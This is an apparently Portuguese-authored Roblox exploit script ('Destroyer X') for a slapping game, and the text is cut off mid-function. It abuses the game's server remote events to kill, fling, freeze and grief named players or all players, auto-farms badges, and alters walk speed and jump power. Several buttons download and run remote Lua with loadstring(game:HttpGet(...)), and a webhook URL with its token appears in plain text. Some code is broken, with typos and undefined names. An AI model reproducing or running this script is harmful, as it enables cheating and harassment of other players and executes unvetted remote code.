local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(66.5211716, -3.68304896, 51.6583672, 0.999495745, -0.000180488845, -0.031752333, -7.9770889e-06, 0.999982357, -0.00593521679, 0.0317528434, 0.0059324773, 0.999478102)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(32.8925018, -3.68992615, 79.2181015, -0.459032267, 0.00643137656, 0.888396382, -1.23377831e-05, 0.999973893, -0.00724549498, -0.888419628, -0.00333687454, -0.459020138)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-15.7492685, -3.67411065, 62.8903618, 0.735257268, -0.00149619766, 0.677786529, -2.33467858e-06, 0.999997675, 0.00221000356, -0.677788198, -0.00162650354, 0.73525548)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-73.728508, -3.68275738, 35.6343575, 0.899922609, 0.00256221951, 0.436042219, -7.73211468e-06, 0.999982834, -0.0058600232, -0.436049789, 0.00527019473, 0.899907053)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-84.5807877, -3.70551586, -5.40603018, 0.701478124, 0.00039245229, -0.71269089, -1.341288e-06, 0.999999821, 0.000549351156, 0.712690949, -0.000384408311, 0.701478004)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-22.7263699, -3.67834139, 10.0932884, 0.349514067, -0.00394687243, -0.936922848, -3.40296856e-06, 0.999991119, -0.00421382533, 0.936931133, 0.00147598411, 0.349510968)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-1.6882391, -3.70633173, -74.3923874, -0.925445616, 0.00175141764, 0.378876507, -9.94363404e-07, 0.999989271, -0.00462503685, -0.37888056, -0.00428059651, -0.925435662)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)

   end
end    
})



TabMisc:AddToggle({
	Name = "Push Lobby Players",
	Default = false,
	Callback = function(Value)
PushPlayer = Value
while PushPlayer do
fireclickdetector(workspace.Lobby["Pusher"].ClickDetector)
wait(0.1)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-821.022644, 329.341156, -2.04819012, -0.0186797082, -0.00294048851, -0.999821246, -1.33748063e-06, 0.999995708, -0.00294097653, 0.999825537, -5.3597214e-05, -0.0186796319)

character:SetPrimaryPartCFrame(cframe) 
wait(0.1)
game:GetService("ReplicatedStorage").PusherWall:FireServer() 
wait(7)
  end
end    
})



TabMisc:AddTextbox({
	Name = "Kill Player Rob",
	Default = "UserHere",
	TextDisappear = false,
	Callback = function(Value)
KillPlr = Value
end	  
})


TabMisc:AddButton({
	Name = "Kill Player",
	Callback = function()
game:GetService("ReplicatedStorage").rob:FireServer()
    wait(4.5)

        local Player = game.Players:FindFirstChild(KillPlr)
        if Player then
            game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)
  end
end    
})


TabMisc:AddTextbox({
	Name = "WalkSpeed",
	Default = "16",
	TextDisappear = false,
	Callback = function(Value)
SpeedSet = Value
	end	  
})

TabMisc:AddToggle({
	Name = "Set Speed",
Default = false,
	Callback = function(Value)
SpeedFastSet = Value
while SpeedFastSet do
local player = game.Players.LocalPlayer
local novaVelocidade = SpeedSet

if player then
    local character = player.Character or player.CharacterAdded:Wait()
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.WalkSpeed = novaVelocidade
    end
end
wait(0.1)
end
  	end 
})

TabMisc:AddTextbox({
	Name = "Jumppower",
	Default = "16",
	TextDisappear = false,
	Callback = function(Value)
JumpSet = Value
	end	  
})


TabMisc:AddToggle({
	Name = "Set Jumppower",
	Default = false,
	Callback = function(Value)
SetFastJump = Value
while SetFastJump do
local player = game.Players.LocalPlayer
local newJumpPower = JumpSet

if player then
    local character = player.Character or player.CharacterAdded:Wait()
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.JumpPower = newJumpPower
    end
end
wait(0.1)
 end
end    
})



TabTrolling:AddTextbox({
    Name = "Jet Player",
    Default = "User",
    TextDisappear = false,
    Callback = function(Value)
        JetTarget = Value
    end
})

TabTrolling:AddButton({
    Name = "Start Jet",
    Callback = function()
        local Player = game.Players:FindFirstChild(etTarget)
        if Player then
            game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)

wait(0.2)

        local args = {
            [1] = game.Players[JetTarget].Character
        }

        game:GetService("ReplicatedStorage").AirStrike:FireServer(unpack(args))
wait(0.2)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            character:SetPrimaryPartCFrame(cframe)
  end
end
})


TabTrolling:AddTextbox({
    Name = "Track Player",
    Default = "User",
    TextDisappear = false,
    Callback = function(Value)
        TrackPlr = Value
    end
})

TabTrolling:AddButton({
    Name = "Start Track",
    Callback = function()
      local args = {
            [1] = game.Players[TrackPlr].Character
        }

        game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))

    end
})

TabTrolling:AddTextbox({
    Name = "Sbeve Player",
    Default = "User",
    TextDisappear = false,
    Callback = function(Value)
        SbavePlr = Value
    end
})

TabTrolling:AddButton({
    Name = "Start Sbeve",
    Callback = function()
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
wait(0.2)
        local Player = game.Players:FindFirstChild(SbavePlr)
        if Player then
            game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)
  end
end
})


TabTrolling:AddButton({
	Name = "Sbeve All",
	Callback = function()
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()

wait(0.5)
local teleportInterval = 0.2

local function teleportToPlayer(player)
    game.Players.LocalPlayer.Character:MoveTo(player.Character.HumanoidRootPart.Position)
end

local function teleportToAllPlayers()
    for _, player in ipairs(players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer then
            teleportToPlayer(player)
            wait(teleportInterval)
        end
   end
end

teleportToAllPlayers()
wait(1)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            character:SetPrimaryPartCFrame(cframe)
end    
})

TabTrolling:AddButton({
	Name = "Invisible Sbeve",
	Callback = function()
local player = game.Players.LocalPlayer
player.Character:WaitForChild("Humanoid").Health = 0
wait(5)
fireclickdetector(workspace.Lobby["Sbeve"].ClickDetector)
wait(1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
wait(1)
fireclickdetector(workspace.Lobby["Ghost"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Ghostinvisibilityactivated"):FireServer()
wait(2)
fireclickdetector(workspace.Lobby["spin"].ClickDetector)
end    
})

TabBadges:AddDropdown({
	Name = "Retro ",
	Default = "1",
	Options = {"Retro Portal", "Admin Button"},
	Callback = function(Value)
if Value == "Retro Portal" then
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-27775.8398, 169.833038, 4834.57959, 0.99712044, -0.00446669897, 0.0757019073, -0.000238499168, 0.998074174, 0.0620315783, -0.0758331865, -0.0618710108, 0.995199084)
character:SetPrimaryPartCFrame(cframe)
elseif Value == "Admin Button" then
  local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-16975.8633, 802.873535, 4906.38477, 0.843354285, 0.000977211399, 0.537357092, -5.48743969e-07, 0.999998331, -0.0018176845, -0.537357986, 0.00153265614, 0.843352854)
character:SetPrimaryPartCFrame(cframe)
  end
end
})


local playerName = game.Players.LocalPlayer.Name
TabStart:AddLabel("Welcome to Destroyer X " .. playerName)

TabSetting:AddTextbox({
  Name = "Join Server",
  Default = "ID",
  TextDisappear = false,
  Callback = function(Value)
TargetServer = Value
end
})

TabSetting:AddButton({
	Name = "Join",
	Callback = function()
local teleportService = game:GetService("TeleportService")
local placeId = game.PlaceId
local serverId = TargetServer 

local function teleportToServer()

    local success, errorMessage = pcall(function()
        teleportService:TeleportToPlaceInstance(placeId, serverId, game.Players.LocalPlayer)
    end)
    
    if not success then
     OrionLib:MakeNotification({
                    Name = "Ops",
                    Content = "Invalid ID",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })   
    end
end

teleportToServer()
end

})


TabStart:AddButton({
	Name = "Copy Guilded Server Link",
	Callback = function()
setclipboard("https://www.guilded.gg/i/kedmrKW2")
end    
})


TabStart:AddLabel("Join the Guilded server to use webhooks!")


local CframePlr = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

local CframePlrLabel =
TabStart:AddLabel("Your Cframe: " .. tostring(CframePlr))

TabStart:AddButton({
	Name = "Copy your Cframe",
	Callback = function()
local playerCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local TextCopy = "" .. tostring(playerCFrame)
setclipboard(TextCopy)   	
  	end    
})




TabSetting:AddTextbox({
  Name = "Suggestion or Bug Report",
  Default = "User",
  TextDisappear = false,
  Callback = function(Value)
BugSuggest = Value
end
})
TabSetting:AddButton({
  Name = "Send Bug/Suggestion",
  Callback = function()
if game.workspace:FindFirstChild("LockerPart") or BugSuggest == "Text" or BugSuggest == "" then
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "Your suggestion is a blank text or is Text or you reached the Limit of suggestions.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
else

local Webhook_URL = "https://media.guilded.gg/webhooks/3a4783cb-60a7-485d-be9e-c8a2da26dfbf/uqir7S3cwCKMqEAWOAWm4akqI8qekYciCOUGakIU8626GWIUAGQSs8yquYsO4OG8EAS0K8kE2uK0UwauAcuACi"

-- Dados do jogador (mensagem a ser enviada)
local PlayerData = game:GetService("HttpService"):JSONEncode({
    content = "",
    embeds = {
        {
            title = "Suggestion/Bug Report",
            description = BugSuggest,
            color = 16711680 -- Vermelho
        }
    }
})

-- Cabeçalhos da requisição
local Headers = {
    ["Content-Type"] = "application/json"
}

-- Função para enviar a requisição HTTP
local Request = http_request or request or HttpPost or syn.request
local success, response = pcall(function()
    return Request({
        Url = Webhook_URL,
        Body = PlayerData,
        Method = "POST",
        Headers = Headers
 
    })
end)


if success then
    print("Mensagem enviada com sucesso!")
else
    warn("Falha ao enviar mensagem: " .. tostring(response))
end
 wait(0.1)
local lockerPart = Instance.new("Part")
lockerPart.Name = "LockerPart"

local distantePos = Vector3.new(0, 0, 0) 
local direcao = Vector3.new(1, 0, 0) 
local posLockerPart = distantePos + direcao * 49000

lockerPart.Position = posLockerPart
lockerPart.Parent = game.Workspace

-- Torne a LockerPart invisível
lockerPart.Visible = false
    end
   end
})



TabSetting:AddButton({
  Name = "Anti-Lag",
  Callback = function()
    local function disableVFX()
    local player = game.Players.LocalPlayer

    local function disableEffects(object)
        for _, descendant in ipairs(object:GetDescendants()) do
            if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Light") then
                descendant.Enabled = false
            elseif descendant:IsA("Beam") or descendant:IsA("Sparkles") or descendant:IsA("Fire") or descendant:IsA("Smoke") or descendant:IsA("Explosion") then
                descendant:Destroy()
            end

            if descendant:IsA("BasePart") and descendant.Material == Enum.Material.Neon then
                descendant.Material = Enum.Material.SmoothPlastic
            end

            if descendant:IsA("Texture") or descendant:IsA("Decal") then
                descendant:Destroy()
            end

            if descendant:IsA("SurfaceAppearance") then
                descendant:Destroy()
            end
        end
    end

    if player.Character then
        disableEffects(player.Character)
    end

    player.CharacterAdded:Connect(function(character)
        disableEffects(character)
    end)

    disableEffects(game.Workspace)
end

disableVFX()

local function removeTextures()
    for _, obj in ipairs(game.Workspace:GetDescendants()) do
        if obj:IsA("Texture") or obj:IsA("Decal") then
            obj:Destroy()
        end
    end
end

removeTextures()

game.Workspace.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Light") then
        descendant.Enabled = false
    elseif descendant:IsA("Beam") or descendant:IsA("Sparkles") or descendant:IsA("Fire") or descendant:IsA("Smoke") or descendant:IsA("Explosion") then
        descendant:Destroy()
    end

    if descendant:IsA("BasePart") and descendant.Material == Enum.Material.Neon then
        descendant.Material = Enum.Material.SmoothPlastic
    end

    if descendant:IsA("Texture") or descendant:IsA("Decal") then
        descendant:Destroy()
    end

    if descendant:IsA("SurfaceAppearance") then
        descendant:Destroy()
    end
end)

game.Players.PlayerAdded:Connect(function(newPlayer)
    newPlayer.CharacterAdded:Connect(function(character)
        disableEffects(character)
    end)
end)
    end
})

TabSetting:AddButton({
  Name = "Hide Nametag (ClientSided)",
  Callback = function()
 while true do
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Head") then
        local head = game.Players.LocalPlayer.Character.Head
        if head:FindFirstChild("Nametag") then
            head.Nametag:Destroy()
        end
    end
    wait(0.001) -- Aguarda 1 segundo antes de verificar novamente
end
  end
})
TabSetting:AddButton({
  Name = "Get Infinite Slaps (ClientSided)",
  Callback = function()
while true do
    game.Players.LocalPlayer.leaderstats.Slaps.Value = 999999999999
    wait(1) 
end
  end
})

_G.InfoGet = true -- Inicializa como verdadeiro para começar com as informações ativadas
local updateInfoRunning = false -- Variável para controlar a execução do loop

local function updateInfo()
    local player = game.Players.LocalPlayer
    if CframePlrLabel and PlayerCountingEl then
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local playerCFrame = player.Character.HumanoidRootPart.CFrame
            if CframePlrLabel.Set then
                CframePlrLabel:Set("Your CFrame: " .. tostring(playerCFrame))
            end
        else
            if CframePlrLabel.Set then
                CframePlrLabel:Set("Your CFrame: Not available")
            end
        end

        if PlayerCountingEl.Set then
            PlayerCountingEl:Set("Players in the server: " .. #game.Players:GetPlayers())
        end
    end
end

local function toggleInfo(Value)
    _G.InfoGet = Value
    if _G.InfoGet and not updateInfoRunning then
        updateInfoRunning = true
        spawn(function()
            while _G.InfoGet do
                updateInfo()
                wait(0.03) -- Intervalo de espera mínimo para alta taxa de atualização (aproximadamente 30 updates por segundo)
            end
            updateInfoRunning = false
        end)
    elseif not _G.InfoGet then
        updateInfoRunning = false
    end
end

-- Chama a função de alternância para iniciar ou parar a atualização de informações
toggleInfo(_G.InfoGet)

TabSetting:AddToggle({
    Name = "Script info",
    Default = true,
    Callback = toggleInfo
})


TabBadges:AddButton({
  Name = "Get Frostbite Badge",
  Callback = function()
 local teleportFunc = queueonteleport or queue_on_teleport or syn and syn.queue_on_teleport
if teleportFunc then
    teleportFunc([[
        if not game:IsLoaded() then
            game.Loaded:Wait()
        end
        repeat wait() until game.Players.LocalPlayer
        wait(4.6)
        local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-558.589844, 181.534332, 54.2535057, 0.0728007704, 1.12684567e-07, 0.99734652, 3.4404799e-08, 1, -1.1549573e-07, -0.99734652, 4.2721684e-08, 0.0728007704)
character:SetPrimaryPartCFrame(cframe)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
wait(0.1)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)

    ]])
end
game:GetService("TeleportService"):Teleport(17290438723)
end
})



TabMain:AddToggle({
  Name = "Spam Counter",
  Default = false,
  Callback = function()
CounterSpam = Value
while CounterSpam do
game:GetService("ReplicatedStorage").Counter:FireServer()
wait(5)
  end
end
})

TabMisc:AddTextbox({
  Name = "Freeze Player",
  Default = "User",
  TextDisappear = false,
  Callback = function(Value)
FreezePlr = Value
end
})

TabMisc:AddButton({
  Name = "Start Freeze",
  Callback = function()

        local Player = game.Players:FindFirstChild(FreezePlr)
        if Player then
            game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)

wait(0.1)
local args = {
    [1] = 0.013125000614672899
}

game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
 end
end
})


TabBadges:AddButton({
  Name = "Get Plank",
  Callback = function()
local player = game.Players.LocalPlayer
player.Character:WaitForChild("Humanoid").Health = 0
wait(4.5)
    fireclickdetector(workspace.Lobby["Fort"].ClickDetector)
wait(0.5)
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1.TouchInterest.Parent, 0)
wait(0.8)
  local jogador = game.Players.LocalPlayer
  local destinoCFrame = CFrame.new(-41.9325562, 80.8319855, -13.6469755, 0.659963608, -0.0710770115, 0.747927904, -7.81229872e-08, 0.99551481, 0.0946057364, -0.751297593, -0.0624363981, 0.657003522)
jogador.Character:SetPrimaryPartCFrame(destinoCFrame)
wait(0.1)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(0.8)
game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
wait(0.3)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.01)
local jogador = game.Players.LocalPlayer
  local destinoCFrame = CFrame.new(-47.7859917, 90.0488815, -22.9939518, 0.740801275, -2.72163394e-08, -0.67172426, -1.3787224e-11, 1, -4.05323384e-08, 0.67172426, 3.00356682e-08, 0.740801275)
jogador.Character:SetPrimaryPartCFrame(destinoCFrame)
UnanchorTorso()
end
})

TabImmunity:AddToggle({
  Name = "Anti-Record",
  Default = false,
  Callback = function(Value)
 AntiRec = Value
end
})


TabTrolling:AddToggle({
  Name = "Plank All",
  Default = false,
  Callback = function(Value)
PlankAll = Value
while PlankAll do

-- Importe os serviços necessários
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Obtenha uma lista de todos os jogadores no jogo
local players = Players:GetPlayers()

-- Se houver jogadores no jogo
if #players > 0 then
    -- Escolha um jogador aleatório
    local randomPlayer = players[math.random(1, #players)]
    
    -- Verifique se o jogador escolhido tem um personagem e se tem a instância "entered"
    if randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        -- Defina a CFrame para a posição do jogador escolhido aleatoriamente
        local args = {
            [1] = randomPlayer.Character.HumanoidRootPart.CFrame,
            [2] = Vector3.new(92.90017700195312, 3, 0.3499999940395355)
        }
        
        -- Envie a CFrame para o servidor
        ReplicatedStorage:WaitForChild("GeneralAbility"):FireServer(unpack(args))
    else
        print("O jogador escolhido não tem a instância 'entered' em seu personagem.")
    end
else
    print("Não há jogadores no jogo.")
end

wait(0.1)
end
end
})


TabTrolling:AddTextbox({
    Name = "Plank Player",
    Default = "User",
    TextDisappear = false,
    Callback = function(Value)
        TargetPlank = Value
    end	  
})

TabTrolling:AddButton({
    Name = "Plank Start",
    Callback = function()
        local player = game.Players:FindFirstChild(TargetPlank)
        if player then
            local playerCFrame = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.CFrame
            if playerCFrame then
                local args = {
                    [1] = playerCFrame,
                    [2] = Vector3.new(92.90017700195312, 3, 0.3499999940395355)
                }
                game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
            else
                print("O jogador não possui uma CFrame válida.")
            end
        else
            print("Jogador não encontrado.")
        end
    end    
})




TabMisc:AddToggle({
    Name = "Auto Join Arena",
    Default = false,
    Callback = function(Value)
        AutoJ = Value
        if AutoJ then
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1.TouchInterest.Parent, 0)
        else 
          print("waiting")
        end
        while AutoJ do
            wait() -- Espera até o próximo quadro

            -- Verifica se o jogador está vivo
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then
print("Waiting For Respawn")
wait(4.5)
                firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1.TouchInterest.Parent, 0)
            end
        end
    end
})



TabMisc:AddButton({
  Name = "Hitbox",
  Callback = function()
loadstring(game:HttpGet(("https://gist.githubusercontent.com/stellar-4242/430ef3087d8d87eb306ca03e728ffbb8/raw/798429dd908b1f4471a1fa569ff62c5e5a93ec61/SLAP.LUA")))()
end
})



TabTrolling:AddButton({
  Name = "Nightmare all",
  Callback = function()
if game.Players.LocalPlayer.Character:FindFirstChild("entered") then
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in the lobby",
    Image = "rbxassetid://17748409757",
    Time = 5
})
else
  fireclickdetector(workspace.Lobby.Ghost.ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Ghostinvisibilityactivated"):FireServer()
wait(0.1)
fireclickdetector(workspace.Lobby.Nightmare.ClickDetector)
wait(0.1)
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 0)
wait(0.3)
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Function to calculate distance between two points
local function distance(point1, point2)
    return (point1 - point2).magnitude
end

-- Function to find the nearest player to the LocalPlayer
local function findNearestPlayer()
    local nearestPlayer = nil
    local minDistance = math.huge

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local character = player.Character
            if character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    local dist = distance(LocalPlayer.Character.HumanoidRootPart.Position, humanoidRootPart.Position)
                    if dist < minDistance then
                        minDistance = dist
                        nearestPlayer = player
                    end
                end
            end
        end
    end

    return nearestPlayer
end

-- Function to teleport to all players and execute nightmarehit
local function teleportAndExecute()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
            wait(0.4) -- Wait for a short time to teleport to the next player
            -- Assuming "Right Leg" is a part of the player's character
            local rightLeg = player.Character:FindFirstChild("Right Leg")
            if rightLeg then
                -- Fire the nightmarehit event on the server
                game:GetService("ReplicatedStorage"):WaitForChild("nightmarehit"):FireServer(rightLeg)
            else
                print("Right Leg not found for player:", player.Name)
            end
        end
    end
end

-- Teleport to all players and execute nightmarehit
teleportAndExecute()

wait(1)
game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
  end
end
})




TabBadges:AddTextbox({
	Name = "Help Player Get Admin",
	Default = "User",
	TextDisappear = false,
	Callback = function(Value)
AdminHP = Value
	end	  
})

TabBadges:AddButton({
  Name = "Start Admin Help",
  Callback = function()
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "Recall" then

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local newCFrame = CFrame.new(-16976.457, 801.521973, 4906.18604, 0.98645401, -2.89873849e-08, -0.164038122, 2.62494044e-08, 1, -1.88587617e-08, 0.164038122, 1.42973979e-08, 0.98645401)

humanoid.RootPart.CFrame = newCFrame
wait(0.1)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(0.1)
            local args = {
                [1] = game:GetService("Players").LocalPlayer.Character.Recall,
                [2] = Vector3.new(55.76399230957031, -5.172937870025635, 45.26799011230469)
            }

            game:GetService("ReplicatedStorage"):WaitForChild("Recall"):InvokeServer(unpack(args))
wait(2.4)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = false
wait(0.1)
        local Player = game.Players:FindFirstChild(AdminHP)
        if Player then
            game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)
  end
 end
end
})

TabBadges:AddButton({
  Name = "All Recall Answers",
  Callback = function()
setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/patrociuq123/destsecretplace/main/RecallHelper"))()')
wait(0.1)
OrionLib:MakeNotification({
    Name = "Copied Script",
    Content = "Script set to your clipboard",
    Image = "rbxassetid://17748409757",
    Time = 5
})
end
})

TabBadges:AddButton({
  Name = "Teleport to Admin",
  Callback = function()
    loadstring(game:HttpGet("https://pastefy.app/AkfXlNWM/raw"))()
end
})

TabBadges:AddButton({
  Name = "Get Spoonful Glove",
  Callback = function()
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Tycoon" then
firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Lobby.Teleport1, 0)
wait(0.8)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local newCFrame = CFrame.new(292.492065, 13.4530268, 260.609802, -0.100594856, 2.99835285e-08, 0.994927466, 2.5191324e-10, 1, -3.01109253e-08, -0.994927466, -2.77836887e-09, -0.100594856)

humanoid.RootPart.CFrame = newCFrame
wait(0.5)

local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(0.1)

game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
wait(0.5)

game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
wait(0.3)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function checkTextLabel()
    local player = Players.LocalPlayer
    local playerName = player.Name
    
    while true do
        local textLabel = game.Workspace:FindFirstChild("ÅTycoon" .. playerName)
                            :FindFirstChild("Counter")
                            :FindFirstChild("Part")
                            :FindFirstChild("SurfaceGui")
                            :FindFirstChild("TextLabel")
        
        if textLabel then
            local textValue = tonumber(textLabel.Text)
            if textValue and textValue < 5000 then
                local clickPart = game.Workspace:FindFirstChild("ÅTycoon" .. playerName):FindFirstChild("Click")
                if clickPart and clickPart:FindFirstChild("ClickDetector") then
                    fireclickdetector(clickPart.ClickDetector)
                else
                    warn("Farming..")
                end
            else
                local head = player.Character:WaitForChild("Head")
                head.Anchored = false
                break  -- Saia do loop quando o valor for 5000 ou mais
            end
        else
            warn("TextLabel não encontrado.")
        end
        wait() -- Aguarda um frame antes de verificar novamente
    end
end

-- Executa a função para verificar constantemente o TextLabel
checkTextLabel()
else
 OrionLib:MakeNotification({
                        Name = "Ops",
                        Content = "You need to equip Tycoon First",
                        Image = "rbxassetid://17748409757",
                        Time = 5
                    }) 
   end
end
})

TabBadges:AddButton({
  Name = "Farm Voodo",
  Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

if game.Players.LocalPlayer.Character:FindFirstChild("entered") and game.Players.LocalPlayer.leaderstats.Glove.Value == "Ghost" and 
character:FindFirstChild("Ghost") then
 
 local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")

    local newCFrame = CFrame.new(5597.26465, 181.799469, -146.706467, -0.435461491, 0.00667448156, 0.900182664, -1.16910187e-05, 0.999972463, -0.00742003508, -0.9002074, -0.00324165984, -0.435449421)

    humanoid.RootPart.CFrame = newCFrame
 wait(0.03)
  game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
  wait(0.2)
  local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
else
  OrionLib:MakeNotification({
                        Name = "Ops",
                        Content = "You need to equip Ghost and join the arena",
